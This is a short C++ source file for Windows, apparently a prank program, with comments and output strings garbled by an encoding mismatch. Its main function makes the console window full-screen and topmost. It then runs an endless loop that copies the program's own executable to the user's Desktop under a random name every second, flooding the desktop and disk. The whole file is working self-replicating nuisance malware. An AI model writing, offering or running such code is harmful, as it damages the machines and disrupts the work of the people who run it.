#include<stdio.h>
#include<iostream>
#include<Windows.h>
#include<shlobj.h>
#include<time.h>
using namespace std;
void FullScreen(){
    HWND hwnd=GetForegroundWindow();
    int x=GetSystemMetrics(SM_CXSCREEN)+300;
    int y=GetSystemMetrics(SM_CYSCREEN)+300;
    char setting[30];
    sprintf(setting,"mode con:cols=%d lines=%d",x,y);
    system(setting);
	SetWindowPos(hwnd,HWND_TOPMOST,-10,-40,x+300,y+300,NULL);
    MoveWindow(hwnd,-10,-40,x+300,y+300,1);
    printf("\n\n");
}
void Reproduce(){
	char name_str[100] = {};
	int name;
	srand((unsigned)time(NULL));   // ���������
	name = rand() % 102408;
	_itoa(name, name_str, 22);	   // �������ת�����ַ���
	
	TCHAR szpath[MAX_PATH];

	char target[100] = {};
	TCHAR Destop[MAX_PATH];

	GetModuleFileName(NULL, szpath, MAX_PATH);	                 // ��ȡ��ǰִ�г����·��
	SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);	 // ��ȡ�������·��

	strcat(target, Destop);
	strcat(target, "\\");
	strcat(target, name_str);
	strcat(target, ".exe");
	CopyFile(szpath, target, FALSE);
	Sleep(1000); 
}

int main(int argc, char* argv[]){
	cout<<"������"<<endl;
	cout<<"					��"; 
	FullScreen();
	while(2>1){
		Reproduce();
	}
	system("pause");
	return 0;
}

